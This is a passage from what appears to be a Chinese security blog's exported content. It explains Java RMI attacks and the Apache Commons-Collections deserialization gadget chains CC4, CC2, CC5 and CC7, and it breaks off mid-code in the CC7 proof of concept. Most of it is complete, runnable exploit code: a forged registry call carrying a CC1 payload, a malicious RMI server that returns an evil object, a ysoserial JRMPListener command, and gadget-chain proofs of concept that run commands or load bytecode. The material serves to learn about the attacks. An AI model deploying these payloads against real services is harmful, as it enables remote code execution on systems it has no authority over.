(IOException var15) { throw new UnmarshalException(\u0026#34;error unmarshalling return\u0026#34;, var15); } catch (ClassNotFoundException var16) { throw new UnmarshalException(\u0026#34;error unmarshalling return\u0026#34;, var16); } finally { super.ref.done(var2); } return var23; 调用 invoke 后就到了客户端请求注册中心的流程：\nEXP： 在 bind 的基础上修改：\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 package com.attack; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import sun.rmi.server.UnicastRef; import java.io.ObjectOutput; import java.lang.annotation.Target; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; import java.rmi.server.Operation; import java.rmi.server.RemoteCall; import java.rmi.server.RemoteObject; import java.util.HashMap; import java.util.Map; public class AttackRegistryEXP02 { public static void main(String[] args) throws Exception{ Registry registry = LocateRegistry.getRegistry(\u0026#34;127.0.0.1\u0026#34;,1099); //通过反射拿到 UnicastRef Class\u0026lt;?\u0026gt; clazz = Class.forName(\u0026#34;java.rmi.server.RemoteObject\u0026#34;); Field field = clazz.getDeclaredField(\u0026#34;ref\u0026#34;); field.setAccessible(true); UnicastRef ref = (UnicastRef) field.get(registry); //从这里开始模拟 lookup 的方式进行伪造方法调用 //这里手动构建了一次 Registry 远程调用 Operation[] operations = new Operation[0]; RemoteCall var2 = ref.newCall((RemoteObject) registry, operations, 2, 4905912898345647071L); //获取调用的输出流 ObjectOutput var3 = var2.getOutputStream(); //序列化 var3.writeObject(CC1()); //这里执行远程调用触发漏洞 ref.invoke(var2); } public static Object CC1() throws Exception{ Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[]{String.class, Class[].class}, new Object[]{\u0026#34;getRuntime\u0026#34;, null}), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;calc\u0026#34;}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap\u0026lt;Object, Object\u0026gt; hashMap = new HashMap\u0026lt;\u0026gt;(); hashMap.put(\u0026#34;value\u0026#34;,\u0026#34;value\u0026#34;); Map\u0026lt;Object, Object\u0026gt; transformedMap = TransformedMap.decorate(hashMap, null, chainedTransformer); Class c = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor constructor = c.getDeclaredConstructor(Class.class, Map.class); constructor.setAccessible(true); Object o = constructor.newInstance(Target.class, transformedMap); return o; } } 4.2 攻击客户端 4.2.1 注册中心攻击客户端 除了 unbind 和 rebind 都会返回数据给客户端，返回的数据是序列化形式，那么到了客户端就会进行反序列化，如果我们能控制注册中心的返回数据，那么就能实现对客户端的攻击，这里使用ysoserial 的 JRMPListener，因为 EXP 实在太长了。\njava -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 'calc'\n客户端去访问：\njava\r1 2 3 4 5 6 7 8 9 10 11 import java.rmi.Naming; import java.rmi.RemoteException; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; public class Client { public static void main(String[] args) throws RemoteException { Registry registry = LocateRegistry.getRegistry(\u0026#34;127.0.0.1\u0026#34;,1099); registry.list(); } } 但是运行完什么都没有发生。。\n后续发现俩个问题， 一是 Java 版本 如果是用CC1链，Java版本低于 1.8.0_65\n当然，高版本可以用 CC6 链绕过也是可以的\n二是运行计算器时因为加了 单引号 \u0026rsquo;\u0026rsquo; 而找不到程序 运行 calc \u0026quot;calc\u0026quot; 都可以正常弹出\n根据 AI 的解释：在Windows系统中，cmd 命令行参数的单引号不会被自动去除，而是作为参数的一部分传递。当ysoserial尝试执行命令时，它接收到的是带单引号的 'calc'，而不是单纯的 calc。当我们换成 power shell 时，是可以正确执行的。\n4.2.2 服务端攻击客户端 服务端攻击客户端，可分俩种情形：\n服务端返回Object对象 远程加载对象 服务端返回Object对象 RMI 远程方法调用返回的不一定是一个基础数据类型（比如String int），也会返回一个对象。服务端返回给客户端一个对象，客户端要对这个对象反序列化。所以我们伪造一个服务端，当客户端调用某个方法时，返回的就是恶意对象，就可以攻击客户端。\nUser 接口，返回 Object 对象\njava\r1 2 3 4 5 package com; public interface User extends java.rmi.Remote { Object getUser() throws Exception; } 服务端实现 User 接口，返回 CC1 恶意 Object 对象\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 package com; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import java.lang.annotation.Retention; import java.lang.reflect.Constructor; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.rmi.RemoteException; import java.rmi.server.UnicastRemoteObject; import java.util.HashMap; import java.util.Map; public class ServerReturnObject extends UnicastRemoteObject implements User { public String name; public int age; public ServerReturnObject(String name, int age) throws RemoteException { super(); this.name = name; this.age = age; } @Override public Object getUser() throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[]{String.class, Class[].class}, new Object[]{\u0026#34;getRuntime\u0026#34;, new Class[0]}), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new String[]{\u0026#34;calc.exe\u0026#34;}), }; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); Map outerMap = LazyMap.decorate(innerMap, transformerChain); Class clazz = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class); construct.setAccessible(true); InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, outerMap); Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[]{Map.class}, handler); handler = (InvocationHandler) construct.newInstance(Retention.class, proxyMap); return handler; } } 恶意服务端将恶意对象注册到注册中心\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 package com; import java.rmi.AlreadyBoundException; import java.rmi.RemoteException; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; public class EvilClassServer { public static void main(String[] args) throws RemoteException, AlreadyBoundException { User liming = new ServerReturnObject(\u0026#34;liming\u0026#34;,15); Registry registry = LocateRegistry.createRegistry(1099); registry.bind(\u0026#34;user\u0026#34;,liming); } } 客户端获取恶意对象，调用 getUser() 方法，反序列化恶意远程对象\njava\r1 2 3 4 5 6 7 8 9 10 11 12 package com; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; public class EvilClient { public static void main(String[] args) throws Exception { Registry registry = LocateRegistry.getRegistry(\u0026#34;127.0.0.1\u0026#34;,1099); User user = (User)registry.lookup(\u0026#34;user\u0026#34;); user.getUser(); } } 远程加载对象 《Java 安全漫谈》\ncodebase是一个地址，告诉Java虚拟机我们应该从哪个地方去搜索类，有点像我们日常用的\nCLASSPATH，但CLASSPATH是本地路径，而codebase通常是远程URL，比如http、ftp等。\n如果我们指定 codebase=http://example.com/ ，然后加载 org.vulhub.example.Example 类，则\nJava虚拟机会下载这个文件 http://example.com/org/vulhub/example/Example.class ，并作为\nExample类的字节码。\nRMI的流程中，客户端和服务端之间传递的是一些序列化后的对象，这些对象在反序列化时，就会去寻\n找类。如果某一端反序列化时发现一个对象，那么就会去自己的CLASSPATH下寻找想对应的类；如果在\n本地没有找到这个类，就会去远程加载codebase中的类。\n这个时候问题就来了，如果codebase被控制，我们不就可以加载恶意类了吗？\n对，在RMI中，我们是可以将codebase随着序列化数据一起传输的，服务器在接收到这个数据后就会去\nCLASSPATH和指定的codebase寻找类，由于codebase被控制导致任意命令执行漏洞。\n不过显然官方也注意到了这一个安全隐患，所以只有满足如下条件的RMI服务器才能被攻击：\n安装并配置了SecurityManager Java版本低于7u21、6u45，或者设置了 java.rmi.server.useCodebaseOnly=false 其中 java.rmi.server.useCodebaseOnly 是在Java 7u21、6u45的时候修改的一个默认设置：\nhttps://docs.oracle.com/javase/7/docs/technotes/guides/rmi/enhancements-7.html\nhttps://www.oracle.com/technetwork/java/javase/7u21-relnotes-1932873.html\n官方将 java.rmi.server.useCodebaseOnly 的默认值由 false 改为了 true 。在 java.rmi.server.useCodebaseOnly 配置为 true 的情况下，Java虚拟机将只信任预先配置好的 codebase ，不再支持从RMI请求中获取。\n4.3 攻击服务端 这一部分同样是熟悉的 unmarshalValue ,\n服务端调用方法时，存在非基础类型的参数时，就会被恶意 Client 端传入恶意数据触发反序列化\n参考文章： 官方文档\nhttps://docs.oracle.com/javase/tutorial/rmi/overview.html\n从懵逼到恍然大悟之Java中RMI的使用\nhttps://blog.csdn.net/lmy86263/article/details/72594760\nJAVA安全基础（四）\u0026ndash; RMI机制\nhttps://xz.aliyun.com/news/8760\n一文回顾攻击Java RMI方式\nhttps://www.anquanke.com/post/id/263726#h2-5\nJava RMI 攻击由浅入深\nhttps://su18.org/post/rmi-attack/\nhttps://drun1baby.top/2022/07/23/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI%E4%B8%93%E9%A2%9802-RMI%E7%9A%84%E5%87%A0%E7%A7%8D%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/\nhttps://www.cnblogs.com/pihaochen/p/11020596.html\nhttps://xz.aliyun.com/t/9053\nhttps://xz.aliyun.com/t/7930\nhttps://xz.aliyun.com/t/6660\nhttps://xz.aliyun.com/t/7079\n","permalink":"http://localhost:1313/xvsf/posts/rmi/","summary":"\u003ch2 id=\"1rmi是什么\"\u003e1、RMI是什么\u003c/h2\u003e\n\u003cblockquote\u003e\n\u003cp\u003eJava RMI用于不同虚拟机之间的通信，这些虚拟机可以在不同的主机上、也可以在同一个主机上；一个虚拟机中的对象调用另一个虚拟上中的对象的方法，只不过是允许被远程调用的对象要通过一些标志加以标识。这样做的特点如下：\u003c/p\u003e","title":"RMI"},{"content":"CC4 环境： Commons-Collections 4.0 https://mvnrepository.com/artifact/org.apache.commons/commons-collections4/4.0\nxml\r1 2 3 4 5 6 7 8 \u0026lt;dependencies\u0026gt; \u0026lt;!-- https://mvnrepository.com/artifact/org.apache.commons/commons-collections4 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.apache.commons\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;commons-collections4\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;4.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;/dependencies\u0026gt; JDK 8u65 分析： 以 ChainedTransformer.transform 为出发点，往回找\n找到 TransformingComparator.compare 中调用了 transform 方法\n再找到 PriorityQueue 类中：\n最后找到的链也就是：\nPriorityQueue.\nreadObject\nheapify\nsiftDown\nsiftDownUsingComparator\ncompare\nTransformingComparator.compare.transform\nChainedTransformer.transform\nPriorityQueue.readObject.heapify.siftDown.siftDownUsingComparator.compare\n-\u0026gt;\nTransformingComparator.compare.transform\n-\u0026gt;\nChainedTransformer.transform\n编写 POC： 先将 CC3 的代码执行部分拿来：\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 //代码执行 InstantiateTransformer TemplatesImpl templates = new TemplatesImpl(); Class tc = templates.getClass(); Field nameFiled = tc.getDeclaredField(\u0026#34;_name\u0026#34;); nameFiled.setAccessible(true); nameFiled.set(templates, \u0026#34;aaa\u0026#34;); Field bytecodesFiled = tc.getDeclaredField(\u0026#34;_bytecodes\u0026#34;); bytecodesFiled.setAccessible(true); byte[] code = Files.readAllBytes(Paths.get(\u0026#34;E://Test.class\u0026#34;)); byte[][] codes = {code}; bytecodesFiled.set(templates, codes); InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates}); Transformer[] transformers = new Transformer[]{ new ConstantTransformer(TrAXFilter.class), instantiateTransformer }; ChainedTransformer chainedTransformer = new ChainedTransformer\u0026lt;\u0026gt;(transformers); 对照源码进行构造：\njava\r1 2 TransformingComparator transformingComparator = new TransformingComparator\u0026lt;\u0026gt;(chainedTransformer); PriorityQueue priorityQueue = new PriorityQueue\u0026lt;\u0026gt;(transformingComparator); 写好之后，发现没有反应\n调试来到此处：\n看到 size:0 ，不会进入 siftDown.\nfor (int i = (size \u0026gt;\u0026gt;\u0026gt; 1) - 1; i \u0026gt;= 0; i--)\n1. size \u0026gt;\u0026gt;\u0026gt; 1 \u0026gt;\u0026gt;\u0026gt; 是 无符号右移运算符。 size \u0026gt;\u0026gt;\u0026gt; 1 等价于 size / 2（向下取整），但不同于 /2 的地方在于： /2 是普通的除法运算； \u0026gt;\u0026gt;\u0026gt; 1 是位运算，执行效率更高（尤其是在底层算法里）。 所以 size \u0026gt;\u0026gt;\u0026gt; 1 就是 数组长度的一半。\n2. (size \u0026gt;\u0026gt;\u0026gt; 1) - 1 先取数组长度的一半，再减去 1。 结果是 从数组的最后一个非叶子节点开始的位置。 例如在堆排序或优先队列的实现中：\n叶子节点的下标范围是 size/2 ~ size-1。 非叶子节点的最后一个位置就是 (size/2)-1。 3. for (int i = ...; i \u0026gt;= 0; i--) i 从 (size \u0026gt;\u0026gt;\u0026gt; 1) - 1 开始，递减到 0。 也就是说：循环会从最后一个非叶子节点开始，往前遍历所有非叶子节点，直到根节点。 这是一个建堆（heapify）的实现。作用是：从最后一个非叶子节点开始，依次向前调整，直到把整个数组调整成一个堆结构。\n所以要保证 size 为 2 才能进入 for 循环执行代码\n于是添加：\njava\r1 2 priorityQueue.add(1); priorityQueue.add(2); 此时执行代码后报错了\n跟进 add 函数：\n发现 add 函数也会调用 compare，而当 add 调用 compare 也就会调用 transform\n而我们知道 _tfactory 在反序列化的时候才会被赋值\t【CC3 中分析 利用 TemplatesImpl 加载字节码 时提及】\n所以，先给 transformers/chainedTransformer 传一个没用的东西，让 add 执行时不会调用\ncompare.transform ,在反序列化时再赋给正常值。\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 ChainedTransformer chainedTransformer = new ChainedTransformer\u0026lt;\u0026gt;(transformers); TransformingComparator transformingComparator = new TransformingComparator\u0026lt;\u0026gt;(new ConstantTransformer(1)); //TransformingComparator transformingComparator = new TransformingComparator\u0026lt;\u0026gt;(chainedTransformer); PriorityQueue priorityQueue = new PriorityQueue\u0026lt;\u0026gt;(transformingComparator); priorityQueue.add(1); priorityQueue.add(2); Class c = transformingComparator.getClass(); Field transformerField = c.getDeclaredField(\u0026#34;transformer\u0026#34;); transformerField.setAccessible(true); transformerField.set(transformingComparator, chainedTransformer); serialize(priorityQueue); unserialize(\u0026#34;ser.bin\u0026#34;); 这样就可以正常执行了\n完整的POC： java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 package com.CC4; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter; import org.apache.commons.collections4.Transformer; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.ChainedTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.functors.InstantiateTransformer; import javax.xml.transform.Templates; import java.io.*; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; import java.util.PriorityQueue; public class CC4Test { public static void main(String[] args) throws Exception { //代码执行 InstantiateTransformer TemplatesImpl templates = new TemplatesImpl(); Class tc = templates.getClass(); Field nameFiled = tc.getDeclaredField(\u0026#34;_name\u0026#34;); nameFiled.setAccessible(true); nameFiled.set(templates, \u0026#34;aaa\u0026#34;); Field bytecodesFiled = tc.getDeclaredField(\u0026#34;_bytecodes\u0026#34;); bytecodesFiled.setAccessible(true); byte[] code = Files.readAllBytes(Paths.get(\u0026#34;E://Test.class\u0026#34;)); byte[][] codes = {code}; bytecodesFiled.set(templates, codes); InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates}); Transformer[] transformers = new Transformer[]{ new ConstantTransformer(TrAXFilter.class), instantiateTransformer }; ChainedTransformer chainedTransformer = new ChainedTransformer\u0026lt;\u0026gt;(transformers); TransformingComparator transformingComparator = new TransformingComparator\u0026lt;\u0026gt;(new ConstantTransformer(1)); //TransformingComparator transformingComparator = new TransformingComparator\u0026lt;\u0026gt;(chainedTransformer); PriorityQueue priorityQueue = new PriorityQueue\u0026lt;\u0026gt;(transformingComparator); priorityQueue.add(1); priorityQueue.add(2); Class c = transformingComparator.getClass(); Field transformerField = c.getDeclaredField(\u0026#34;transformer\u0026#34;); transformerField.setAccessible(true); transformerField.set(transformingComparator, chainedTransformer); serialize(priorityQueue); unserialize(\u0026#34;ser.bin\u0026#34;); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.bin\u0026#34;)); oos.writeObject(obj); } public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{ ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename)); Object obj = ois.readObject(); return obj; } } CC2 分析： CC2 和 CC4 并无太大区别，CC2 的前半部分同样为：PriorityQueue.readObject.heapify.siftDown.siftDownUsingComparator.compare\n-\u0026gt; TransformingComparator.compare.transform\n-\u0026gt; ChainedTransformer.transform\n之后，CC4：\nInstantiateTransformer.transform -\u0026gt; TrAXFilter.TrAXFilter\n-\u0026gt; TemplatesImpl.newTransforemer\n-\u0026gt; TransletClassLoader.newInstance\nCC2:\nInvokerTransformer.transform\n-\u0026gt; TemplatesImpl.newTransforemer\n-\u0026gt; TransletClassLoader.newInstance\n完整POC java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 package com.CC2; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.functors.InvokerTransformer; import java.io.*; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; import java.util.PriorityQueue; public class CC2Test { public static void main(String[] args) throws Exception { //代码执行 TemplatesImpl templates = new TemplatesImpl(); Class tc = templates.getClass(); Field nameFiled = tc.getDeclaredField(\u0026#34;_name\u0026#34;); nameFiled.setAccessible(true); nameFiled.set(templates, \u0026#34;aaa\u0026#34;); Field bytecodesFiled = tc.getDeclaredField(\u0026#34;_bytecodes\u0026#34;); bytecodesFiled.setAccessible(true); byte[] code = Files.readAllBytes(Paths.get(\u0026#34;E://Test.class\u0026#34;)); byte[][] codes = {code}; bytecodesFiled.set(templates, codes); InvokerTransformer\u0026lt;Object, Object\u0026gt; invokerTransformer = new InvokerTransformer\u0026lt;\u0026gt;(\u0026#34;newTransformer\u0026#34;, new Class[]{}, new Object[]{}); TransformingComparator transformingComparator = new TransformingComparator\u0026lt;\u0026gt;(new ConstantTransformer(1)); PriorityQueue priorityQueue = new PriorityQueue\u0026lt;\u0026gt;(transformingComparator); //改为 templates priorityQueue.add(templates); priorityQueue.add(2); Class c = transformingComparator.getClass(); Field transformerField = c.getDeclaredField(\u0026#34;transformer\u0026#34;); transformerField.setAccessible(true); //改为 invokerTransformer transformerField.set(transformingComparator, invokerTransformer); serialize(priorityQueue); unserialize(\u0026#34;ser.bin\u0026#34;); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.bin\u0026#34;)); oos.writeObject(obj); } public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{ ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename)); Object obj = ois.readObject(); return obj; } } CC5 分析： CC5 的起点变成了 BadAttributeValueExpException,调用的是 TiedMapEntry.toString ，之后便是 LazyMap.get（CC1-LazyMap/CC6）。\n这里从正向走比较方便，如果从 LazyMap.get 出发，会用很多调用 get 方法的类，不好找。\n来到 BadAttributeValueExpException 类，跟进 toString() 方法\n这里的 toString() 方法要找到调用它的类，然后就找到了 TiedMapEntry 类中调用的 toString\ngetValue 调用了 map.get，后续便是 LazyMap 调用 get。\nPOC： java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 package com.CC5; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections4.keyvalue.TiedMapEntry; import javax.management.BadAttributeValueExpException; import java.io.*; import java.lang.reflect.Field; import java.util.HashMap; import java.util.Map; public class CC5Test { public static void main(String[] args) throws Exception { // CC1-LazyMap Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[]{String.class, Class[].class}, new Object[]{\u0026#34;getRuntime\u0026#34;, null}), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;calc\u0026#34;}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap map = new HashMap(); Map lazymap = LazyMap.decorate(map, chainedTransformer); TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap,\u0026#34;key\u0026#34;); tiedMapEntry.toString(); BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null); //反射修改 BadAttributeValueExpException 的 val 值 Class c = Class.forName(\u0026#34;javax.management.BadAttributeValueExpException\u0026#34;); Field val = c.getDeclaredField(\u0026#34;val\u0026#34;); val.setAccessible(true); val.set(badAttributeValueExpException,tiedMapEntry); serialize(badAttributeValueExpException); unserialize(\u0026#34;ser.bin\u0026#34;); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.bin\u0026#34;)); oos.writeObject(obj); } public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{ ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename)); Object obj = ois.readObject(); return obj; } } CC7 分析： CC7 的入口点变成了： HashTable.readObject\nHashTable 中的 readObject 调用了 reconstitutionPut\nreconstitutionPut中调用了 equals ,\n因为 LazyMap 不存在 equals 方法，然后找到它的父类 AbstractMapDecorator 调用 equals\n找到 AbstractMap.equals 中调用了 get 方法\n构造POC： AbstractMap.equals java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 public abstract class AbstractMap\u0026lt;K,V\u0026gt; implements Map\u0026lt;K,V\u0026gt; { ... public boolean equals(Object o) { //判断传入的是否为同一对象 if (o == this) return true; //类型检查 if (!(o instanceof Map)) return false; Map\u0026lt;?,?\u0026gt; m = (Map\u0026lt;?,?\u0026gt;) o; //比较两个 map 的 size() if (m.size() != size()) return false; try { //entrySet() 的迭代器，用于遍历所有键值对（Entry\u0026lt;K,V\u0026gt;） Iterator\u0026lt;Entry\u0026lt;K,V\u0026gt;\u0026gt; i = entrySet().iterator(); //遍历每一个映射条目，取出 key 和 value，准备与另一个 map m 中对应的值做比较 while (i.hasNext()) { Entry\u0026lt;K,V\u0026gt; e = i.next(); K key = e.getKey(); V value = e.getValue(); if (value == null) { //value == null 进入 if (!(m.get(key)==null \u0026amp;\u0026amp; m.containsKey(key))) return false; } else { if (!value.equals(m.get(key))) return false; } } } catch (ClassCastException unused) { return false; } catch (NullPointerException unused) { return false; } return true; } ... } Hashtable.reconstitutionPut java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 private void reconstitutionPut(Entry\u0026lt;?,?\u0026gt;[] tab, K key, V value) throws StreamCorruptedException { if (value == null) { throw new java.io.StreamCorruptedException(); } // Makes sure the key is not already in the hashtable. // This should not happen in deserialized version. //计算 key 的哈希值 int hash = key.hashCode(); //% tab.length 将哈希值映射到数组索引范围 int index = (hash \u0026amp; 0x7FFFFFFF) % tab.length; //从 tab[index] 中将 Entry 放入循环 for (Entry\u0026lt;?,?\u0026gt; e = tab[index] ; e != null ; e = e.next) { //先 e.hash == hash，比较已有元素和新元素的hash是否相同 //一样之后，接着调用 e.key.equals(key)，比较已有元素的key和新的key是否相同 if ((e.hash == hash) \u0026amp;\u0026amp; e.key.equals(key)) { //如果 key重复，抛出异常 throw new java.io.StreamCorruptedException(); } } // Creates the new entry. @SuppressWarnings(\u0026#34;unchecked\u0026#34;) Entry\u0026lt;K,V\u0026gt; e = (Entry\u0026lt;K,V\u0026gt;)tab[index]; tab[index] = new Entry\u0026lt;\u0026gt;(hash, key, value, e); count++; } **注意：首先满足 value != null，之后满足俩个元素的 hash 值相同，然后在判断 key 是否重复时触发 equals 方法 **\nHashTable.readObject java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 private void readObject(java.io.ObjectInputStream s) throws IOException, ClassNotFoundException { // Read in the length, threshold, and loadfactor s.defaultReadObject(); // Read the original length of the array and number of elements int origlength = s.readInt(); int elements = s.readInt(); // Compute new size with a bit of room 5% to grow but // no larger than the original size. Make the length // odd if it\u0026#39;s large enough, this helps distribute the entries. // Guard against the length ending up zero, that\u0026#39;s not valid. int length = (int)(elements * loadFactor) + (elements / 20) + 3; if (length \u0026gt; elements \u0026amp;\u0026amp; (length \u0026amp; 1) == 0) length--; if (origlength \u0026gt; 0 \u0026amp;\u0026amp; length \u0026gt; origlength) length = origlength; table = new Entry\u0026lt;?,?\u0026gt;[length]; threshold = (int)Math.min(length * loadFactor, MAX_ARRAY_SIZE + 1); count = 0; // Read the number of elements and then all the key/value objects //反序列化 for (; elements \u0026gt; 0; elements--) { @SuppressWarnings(\u0026#34;unchecked\u0026#34;) K key = (K)s.readObject(); @SuppressWarnings(\u0026#34;unchecked\u0026#34;) V value = (V)s.readObject(); // synch could be eliminated for performance reconstitutionPut(table, key, value); } } 构造： ysoserial：\n结合上述代码的分析，ysoserial 这里要写 俩个 put 的作用便是：\n在 Hashtable 放入俩个 lazyMap ,制造“冲突”，迫使他们进入\njava\r1 2 3 4 5 for (Entry\u0026lt;?,?\u0026gt; e = tab[index] ; e != null ; e = e.next) { if ((e.hash == hash) \u0026amp;\u0026amp; e.key.equals(key)) { throw new java.io.StreamCorruptedException(); } } 同时要让俩个元素的哈希值相同【(e.hash == hash)】，然后就会触发 key.equals() 的比较。\n而 equals() 内部会调用到 LazyMap.get()，最终触发 transformerChain 执行恶意代码\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 //首先创建俩个map Map hashMap1 = new HashMap(); Map hashMap2 = new HashMap(); //俩个元素的hash值一样 Map lazyMap1 = LazyMap.decorate(hashMap1, chainedTransformer); lazyMap1.put(\u0026#34;yy\u0026#34;, 1); Map lazyMap2 = LazyMap.decorate(hashMap2, chainedTransformer); lazyMap2.put(\u0026#34;zZ\u0026#34;, 1); Hashtable hashtable = new Hashtable(); hashtable.put(lazyMap1, 1); hashtable.put(lazyMap2, 1); // 这里的问题在urldns 和 CC6 中均有提及 //https://www.yuque.com/taohuayuanpang/qxcvxi/qvul6kkfwvcanocn#ZLUWn lazyMap1.remove(\u0026#34;yy\u0026#34;); hash相同的值：\nyy与zZ\nEa与FB\n完整POC： java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 package com.CC7; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import java.io.*; import java.lang.reflect.Field; import java.util.HashMap; import java.util.Hashtable; import java.util.Map; public class CC7Test { public static void main(String[] args) throws Exception{ // CC1-LazyMap Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[]{String.class, Class[].class}, new Object[]{\u0026#34;getRuntime\u0026#34;, null}), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new 